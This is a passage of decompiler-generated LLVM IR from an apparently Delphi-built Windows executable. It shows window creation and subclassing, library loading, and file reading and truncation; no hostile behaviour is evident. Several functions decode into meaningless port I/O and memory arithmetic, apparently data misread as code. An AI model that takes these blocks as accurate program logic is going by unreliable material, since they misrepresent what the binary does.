  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1657
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1657
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221944 to i32*), i32 -4, i32 %3), !insn.addr !1658
  ret i32 %4, !insn.addr !1659
}

define i32 @function_406ca9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406ca9:
  %merge.reg2mem = alloca i32, !insn.addr !1660
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1660
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1660
  store i8 %3, i8* %4, align 1, !insn.addr !1660
  %5 = add i32 %1, 114, !insn.addr !1661
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1661
  %7 = load i8, i8* %6, align 1, !insn.addr !1661
  %8 = udiv i32 %0, 256, !insn.addr !1661
  %9 = trunc i32 %8 to i8, !insn.addr !1661
  %10 = add i8 %7, %9, !insn.addr !1661
  store i8 %10, i8* %6, align 1, !insn.addr !1661
  %11 = add i8 %2, -32, !insn.addr !1662
  %12 = icmp ult i8 %2, 32, !insn.addr !1662
  %13 = icmp eq i8 %11, 0, !insn.addr !1662
  %14 = zext i8 %11 to i32, !insn.addr !1662
  %15 = and i32 %1, -256, !insn.addr !1662
  %16 = or i32 %15, %14, !insn.addr !1662
  %17 = or i1 %12, %13, !insn.addr !1663
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1663
  br i1 %17, label %dec_label_pc_406cb2, label %dec_label_pc_406d21, !insn.addr !1663

dec_label_pc_406cb2:                              ; preds = %dec_label_pc_406ca9
  %18 = add i32 %16, 105, !insn.addr !1664
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1664
  %20 = load i8, i8* %19, align 1, !insn.addr !1664
  %21 = and i8 %20, %9, !insn.addr !1664
  store i8 %21, i8* %19, align 1, !insn.addr !1664
  %22 = trunc i32 %arg3 to i16, !insn.addr !1665
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1665
  %24 = load i8, i8* %23, align 1, !insn.addr !1665
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1665
  %25 = add i32 %arg5, 105, !insn.addr !1666
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1666
  %28 = load i8, i8* %27, align 1, !insn.addr !1666
  %29 = udiv i32 %arg2, 256, !insn.addr !1666
  %30 = trunc i32 %29 to i8, !insn.addr !1666
  %31 = and i8 %28, %30, !insn.addr !1666
  store i8 %31, i8* %27, align 1, !insn.addr !1666
  %32 = mul i32 %arg5, 2, !insn.addr !1667
  %33 = add i32 %arg2, 115, !insn.addr !1667
  %34 = add i32 %33, %32, !insn.addr !1667
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1667
  %36 = load i8, i8* %35, align 1, !insn.addr !1667
  %37 = trunc i32 %arg2 to i8, !insn.addr !1667
  %38 = add i8 %36, %37, !insn.addr !1667
  %39 = icmp eq i8 %38, 0, !insn.addr !1667
  store i8 %38, i8* %35, align 1, !insn.addr !1667
  br i1 %39, label %dec_label_pc_406d03, label %dec_label_pc_406cc1, !insn.addr !1668

dec_label_pc_406cc1:                              ; preds = %dec_label_pc_406cb2
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1669
  %41 = load i32, i32* %40, align 4, !insn.addr !1669
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1669
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1670
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1670
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1670
  %45 = icmp eq i32* %43, null, !insn.addr !1671
  %46 = icmp eq i1 %45, false, !insn.addr !1672
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1672
  br i1 %46, label %dec_label_pc_406d21, label %dec_label_pc_406ce5, !insn.addr !1672

dec_label_pc_406ce5:                              ; preds = %dec_label_pc_406cc1
  %47 = call i32 @function_406c74(), !insn.addr !1673
  %48 = call i32 @function_4036f4(), !insn.addr !1674
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1675
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1676
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1676
  ret i32 %51, !insn.addr !1677

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cb2
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1678
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1678
  store i32 %52, i32* %53, align 4, !insn.addr !1678
  %54 = call i32 @__asm_in.50(i16 %22), !insn.addr !1679
  %55 = and i32 %54, 255, !insn.addr !1680
  %56 = add i32 %55, %arg4, !insn.addr !1680
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1680
  %58 = load i8, i8* %57, align 1, !insn.addr !1680
  %59 = zext i8 %58 to i32, !insn.addr !1680
  %60 = and i32 %54, -256, !insn.addr !1680
  %61 = or i32 %60, %59, !insn.addr !1680
  ret i32 %61, !insn.addr !1680

dec_label_pc_406d21:                              ; preds = %dec_label_pc_406cc1, %dec_label_pc_406ca9
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1680
}

define i32 @function_406dc9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406dc9:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1681
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1681
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1681
  %9 = add i8 %6, %8, !insn.addr !1681
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1681
  store i8 %9, i8* %10, align 1, !insn.addr !1681
  %11 = load i32, i32* %eax, align 4, !insn.addr !1682
  %12 = add i32 %11, 114, !insn.addr !1682
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1682
  %14 = load i8, i8* %13, align 1, !insn.addr !1682
  %15 = udiv i32 %2, 256, !insn.addr !1682
  %16 = trunc i32 %15 to i8, !insn.addr !1682
  %17 = add i8 %14, %16, !insn.addr !1682
  store i8 %17, i8* %13, align 1, !insn.addr !1682
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1683
  %20 = add i8 %19, -32, !insn.addr !1683
  %21 = icmp ult i8 %19, 32, !insn.addr !1683
  %22 = icmp eq i8 %20, 0, !insn.addr !1683
  %23 = zext i8 %20 to i32, !insn.addr !1683
  %24 = and i32 %18, -256, !insn.addr !1683
  %25 = or i32 %24, %23, !insn.addr !1683
  store i32 %25, i32* %eax, align 4, !insn.addr !1683
  %26 = or i1 %21, %22, !insn.addr !1684
  br i1 %26, label %dec_label_pc_406dd2, label %dec_label_pc_406e41, !insn.addr !1684

dec_label_pc_406dd2:                              ; preds = %dec_label_pc_406dc9
  %27 = add i32 %25, 105, !insn.addr !1685
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1685
  %29 = load i8, i8* %28, align 1, !insn.addr !1685
  %30 = and i8 %29, %16, !insn.addr !1685
  store i8 %30, i8* %28, align 1, !insn.addr !1685
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1686
  store i32 %31, i32* %eax, align 4, !insn.addr !1686
  %32 = trunc i32 %arg3 to i16, !insn.addr !1687
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1687
  %34 = load i8, i8* %33, align 1, !insn.addr !1687
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1687
  %35 = add i32 %arg5, 105, !insn.addr !1688
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1688
  %38 = load i8, i8* %37, align 1, !insn.addr !1688
  %39 = udiv i32 %arg2, 256, !insn.addr !1688
  %40 = trunc i32 %39 to i8, !insn.addr !1688
  %41 = and i8 %38, %40, !insn.addr !1688
  store i8 %41, i8* %37, align 1, !insn.addr !1688
  %42 = mul i32 %arg5, 2, !insn.addr !1689
  %43 = add i32 %arg2, 115, !insn.addr !1689
  %44 = add i32 %43, %42, !insn.addr !1689
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1689
  %46 = load i8, i8* %45, align 1, !insn.addr !1689
  %47 = trunc i32 %arg2 to i8, !insn.addr !1689
  %48 = add i8 %46, %47, !insn.addr !1689
  %49 = icmp eq i8 %48, 0, !insn.addr !1689
  store i8 %48, i8* %45, align 1, !insn.addr !1689
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1690
  br i1 %49, label %dec_label_pc_406e23, label %dec_label_pc_406de1, !insn.addr !1690

dec_label_pc_406de1:                              ; preds = %dec_label_pc_406dd2
  %50 = icmp slt i8 %48, 0, !insn.addr !1689
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1691
  %52 = load i32, i32* %51, align 4, !insn.addr !1691
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1691
  br i1 %50, label %dec_label_pc_406e58, label %dec_label_pc_406de6, !insn.addr !1692

dec_label_pc_406de6:                              ; preds = %dec_label_pc_406de1
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1693
  %55 = add i8 %54, -32, !insn.addr !1693
  %56 = icmp ult i8 %54, 32, !insn.addr !1693
  %57 = icmp eq i8 %55, 0, !insn.addr !1693
  %58 = zext i8 %55 to i32, !insn.addr !1693
  %59 = and i32 %53, -256, !insn.addr !1693
  %60 = or i32 %59, %58, !insn.addr !1693
  store i32 %60, i32* %eax, align 4, !insn.addr !1693
  %61 = or i1 %56, %57, !insn.addr !1694
  br i1 %61, label %dec_label_pc_406dea, label %dec_label_pc_406e59, !insn.addr !1694

dec_label_pc_406dea:                              ; preds = %dec_label_pc_406de6
  %62 = add i32 %arg2, 105, !insn.addr !1695
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1695
  %64 = load i8, i8* %63, align 1, !insn.addr !1695
  %65 = udiv i32 %53, 256, !insn.addr !1695
  %66 = trunc i32 %65 to i8, !insn.addr !1695
  %67 = and i8 %64, %66, !insn.addr !1695
  store i8 %67, i8* %63, align 1, !insn.addr !1695
  %68 = add i32 %arg6, 105, !insn.addr !1696
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1696
  %70 = load i8, i8* %69, align 1, !insn.addr !1696
  %71 = and i8 %70, %40, !insn.addr !1696
  store i8 %71, i8* %69, align 1, !insn.addr !1696
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1697
  %74 = load i8, i8* %73, align 1, !insn.addr !1697
  %75 = trunc i32 %72 to i8, !insn.addr !1697
  %76 = add i8 %74, %75, !insn.addr !1697
  store i8 %76, i8* %73, align 1, !insn.addr !1697
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1698
  %79 = load i8, i8* %78, align 1, !insn.addr !1698
  %80 = trunc i32 %77 to i8, !insn.addr !1698
  %81 = add i8 %79, %80, !insn.addr !1698
  store i8 %81, i8* %78, align 1, !insn.addr !1698
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1699
  %83 = load i32, i32* %82, align 4, !insn.addr !1699
  %84 = add i32 %83, %arg6, !insn.addr !1699
  store i32 %84, i32* %82, align 4, !insn.addr !1699
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1700
  %87 = load i8, i8* %86, align 1, !insn.addr !1700
  %88 = trunc i32 %85 to i8, !insn.addr !1700
  %89 = add i8 %87, %88, !insn.addr !1700
  store i8 %89, i8* %86, align 1, !insn.addr !1700
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1701
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1702
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1702
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1702
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1703
  %92 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1704
  %93 = add i32 %92, 1, !insn.addr !1704
  %94 = icmp eq i32 %93, 0, !insn.addr !1704
  store i32 %93, i32* @global_var_4096e0, align 4, !insn.addr !1704
  %95 = icmp eq i1 %94, false, !insn.addr !1705
  br i1 %95, label %dec_label_pc_406e1b, label %dec_label_pc_406e11, !insn.addr !1705

dec_label_pc_406e11:                              ; preds = %dec_label_pc_406dea
  %96 = call i32 @"@LStrClr"(), !insn.addr !1706
  br label %dec_label_pc_406e1b, !insn.addr !1706

dec_label_pc_406e1b:                              ; preds = %dec_label_pc_406e11, %dec_label_pc_406dea
  store i32 0, i32* %eax, align 4, !insn.addr !1707
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1708
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1709
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1709
  br label %dec_label_pc_406e23, !insn.addr !1709

dec_label_pc_406e23:                              ; preds = %dec_label_pc_406e1b, %dec_label_pc_406dd2
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1710
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1710
  store i32 4222512, i32* %99, align 4, !insn.addr !1710
  %100 = load i32, i32* %eax, align 4, !insn.addr !1711
  ret i32 %100, !insn.addr !1711

dec_label_pc_406e41:                              ; preds = %dec_label_pc_406dc9
  %101 = mul i32 %4, 2, !insn.addr !1712
  %102 = add i32 %1, 105, !insn.addr !1712
  %103 = add i32 %102, %101, !insn.addr !1712
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1712
  %105 = load i32, i32* %104, align 4, !insn.addr !1712
  %106 = or i32 %105, %3, !insn.addr !1712
  store i32 %106, i32* %104, align 4, !insn.addr !1712
  %107 = add i32 %0, -1, !insn.addr !1713
  %108 = trunc i32 %3 to i16, !insn.addr !1714
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1714
  %110 = load i32, i32* %109, align 4, !insn.addr !1714
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1714
  %111 = load i32, i32* %eax, align 4, !insn.addr !1715
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1715
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1715
  %115 = or i8 %112, %114, !insn.addr !1715
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1715
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1716
  %118 = load i8, i8* %117, align 1, !insn.addr !1716
  %119 = trunc i32 %116 to i8, !insn.addr !1716
  %120 = add i8 %118, %119, !insn.addr !1716
  store i8 %120, i8* %117, align 1, !insn.addr !1716
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1717
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1717
  %124 = load i8, i8* %123, align 1, !insn.addr !1717
  %125 = add i8 %124, %122, !insn.addr !1717
  %126 = zext i8 %125 to i32, !insn.addr !1717
  %127 = and i32 %121, -256, !insn.addr !1717
  %128 = or i32 %127, %126, !insn.addr !1717
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1718
  %130 = load i8, i8* %129, align 1, !insn.addr !1718
  %131 = trunc i32 %3 to i8, !insn.addr !1719
  %132 = add i8 %125, %131, !insn.addr !1718
  %133 = add i8 %132, %130, !insn.addr !1719
  store i8 %133, i8* %129, align 1, !insn.addr !1719
  %134 = add i32 %128, 1, !insn.addr !1720
  store i32 %134, i32* %eax, align 4, !insn.addr !1720
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1721
  %136 = load i8, i8* %135, align 1, !insn.addr !1721
  %137 = trunc i32 %134 to i8, !insn.addr !1721
  %138 = add i8 %136, %137, !insn.addr !1721
  store i8 %138, i8* %135, align 1, !insn.addr !1721
  br label %dec_label_pc_406e58, !insn.addr !1721

dec_label_pc_406e58:                              ; preds = %dec_label_pc_406e41, %dec_label_pc_406de1
  %139 = load i32, i32* %eax, align 4, !insn.addr !1721
  ret i32 %139, !insn.addr !1721

dec_label_pc_406e59:                              ; preds = %dec_label_pc_406de6
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1722
  %141 = load i8, i8* %140, align 1, !insn.addr !1722
  %142 = add i8 %141, %55, !insn.addr !1722
  store i8 %142, i8* %140, align 1, !insn.addr !1722
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1723
  %145 = load i8, i8* %144, align 1, !insn.addr !1723
  %146 = trunc i32 %arg3 to i8, !insn.addr !1723
  %147 = add i8 %145, %146, !insn.addr !1723
  store i8 %147, i8* %144, align 1, !insn.addr !1723
  %148 = load i32, i32* %eax, align 4, !insn.addr !1724
  %149 = add i32 %148, 1, !insn.addr !1724
  %150 = mul i32 %149, 2, !insn.addr !1725
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1725
  %152 = load i8, i8* %151, align 2, !insn.addr !1725
  %153 = trunc i32 %149 to i8, !insn.addr !1725
  %154 = add i8 %152, %153, !insn.addr !1725
  store i8 %154, i8* %151, align 2, !insn.addr !1725
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1726
  %156 = load i8, i8* %155, align 1, !insn.addr !1726
  %157 = add i8 %156, %153, !insn.addr !1726
  store i8 %157, i8* %155, align 1, !insn.addr !1726
  ret i32 %149, !insn.addr !1727
}

define i32 @function_406e84() local_unnamed_addr {
dec_label_pc_406e84:
  %esp.1.reg2mem = alloca i32, !insn.addr !1728
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1729
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1729
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1729
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1730
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1731
  %3 = call i32 @function_4036f4(), !insn.addr !1732
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1733
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1733
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1733
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1734
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1735
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1736
  br i1 %7, label %dec_label_pc_407023, label %dec_label_pc_406eee, !insn.addr !1736

dec_label_pc_406eee:                              ; preds = %dec_label_pc_406e84
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1734
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1737
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1737
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1738
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1739
  br i1 %12, label %dec_label_pc_407023, label %dec_label_pc_406f0a, !insn.addr !1739

dec_label_pc_406f0a:                              ; preds = %dec_label_pc_406eee
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1740
  %14 = call i32 @function_40374c(), !insn.addr !1741
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1742
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1742
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1743
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1743
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1744
  %19 = call i32 @function_404700(), !insn.addr !1745
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_407023

dec_label_pc_407023:                              ; preds = %dec_label_pc_406f0a, %dec_label_pc_406eee, %dec_label_pc_406e84
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1746
  %21 = load i32, i32* %20, align 4, !insn.addr !1746
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1747
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1748
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1748
  store i32 4223045, i32* %23, align 4, !insn.addr !1748
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1749
  ret i32 %24, !insn.addr !1750
}

define i32 @function_40703e() local_unnamed_addr {
dec_label_pc_40703e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1751
  ret i32 %0, !insn.addr !1751
}

define i32 @function_407043() local_unnamed_addr {
dec_label_pc_407043:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1752
}

define i32 @function_407045(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407045:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1753
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1753
  %3 = load i32, i32* %2, align 4, !insn.addr !1753
  ret i32 %3, !insn.addr !1754
}

define i32 @function_40707c() local_unnamed_addr {
dec_label_pc_40707c:
  %esp.2.reg2mem = alloca i32, !insn.addr !1755
  %esp.1.reg2mem = alloca i32, !insn.addr !1755
  %esi.0.reg2mem = alloca i32, !insn.addr !1755
  %esp.0.reg2mem = alloca i32, !insn.addr !1755
  %ebx.0.reg2mem = alloca i32, !insn.addr !1755
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1756
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1757
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1757
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1757
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1758
  %2 = call i32 @function_403cb4(), !insn.addr !1759
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1760
  br i1 %3, label %dec_label_pc_407165, label %dec_label_pc_4070aa, !insn.addr !1760

dec_label_pc_4070aa:                              ; preds = %dec_label_pc_40707c
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1761
  %5 = call i32 @function_4036f4(), !insn.addr !1762
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1763
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1763
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1763
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1764
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1765
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1766
  br i1 %9, label %dec_label_pc_407165, label %dec_label_pc_4070e6, !insn.addr !1766

dec_label_pc_4070e6:                              ; preds = %dec_label_pc_4070aa
  %10 = call i32 @"@LStrClr"(), !insn.addr !1767
  %11 = call i32 @function_403cbc(), !insn.addr !1768
  %12 = icmp slt i32 %11, 0, !insn.addr !1769
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1770
  br i1 %12, label %dec_label_pc_407130, label %dec_label_pc_4070fe, !insn.addr !1770

dec_label_pc_4070fe:                              ; preds = %dec_label_pc_4070e6
  %13 = add i32 %11, 1, !insn.addr !1771
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1772
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1772
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1772
  br label %dec_label_pc_407101, !insn.addr !1772

dec_label_pc_407101:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070fe
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1773
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1773
  store i32 0, i32* %15, align 4, !insn.addr !1773
  %16 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1774
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1775
  %18 = add i32 %16, %17, !insn.addr !1775
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1775
  %20 = load i32, i32* %19, align 4, !insn.addr !1775
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1775
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1775
  store i32 %20, i32* %22, align 4, !insn.addr !1775
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1776
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1776
  store i32 ptrtoint (i32* @global_var_4071ac to i32), i32* %24, align 4, !insn.addr !1776
  %25 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1777
  %26 = or i32 %17, 4, !insn.addr !1778
  %27 = add i32 %25, %26, !insn.addr !1778
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1778
  %29 = load i32, i32* %28, align 4, !insn.addr !1778
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1778
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1778
  store i32 %29, i32* %31, align 4, !insn.addr !1778
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1779
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1779
  store i32 ptrtoint ([3 x i8]* @global_var_4071b8 to i32), i32* %33, align 4, !insn.addr !1779
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1780
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1781
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1782
  %37 = icmp eq i32 %36, 0, !insn.addr !1782
  %38 = icmp eq i1 %37, false, !insn.addr !1783
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1783
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1783
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1783
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1783
  br i1 %38, label %dec_label_pc_407101, label %dec_label_pc_407130, !insn.addr !1783

dec_label_pc_407130:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070e6
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1764
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_404700(), !insn.addr !1784
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1785
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1785
  store i32 0, i32* %42, align 4, !insn.addr !1785
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1786
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1786
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1786
  store i32 %45, i32* %44, align 4, !insn.addr !1786
  %46 = call i32 @function_4034f4(), !insn.addr !1787
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1788
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1788
  store i32 %46, i32* %48, align 4, !insn.addr !1788
  %49 = call i32 @function_40374c(), !insn.addr !1789
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1790
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1790
  store i32 %49, i32* %51, align 4, !insn.addr !1790
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1791
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1791
  store i32 %39, i32* %53, align 4, !insn.addr !1791
  %54 = call i32 @function_404498(), !insn.addr !1792
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1793
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1793
  store i32 %39, i32* %56, align 4, !insn.addr !1793
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1794
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1795
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1795
  store i32 %39, i32* %59, align 4, !insn.addr !1795
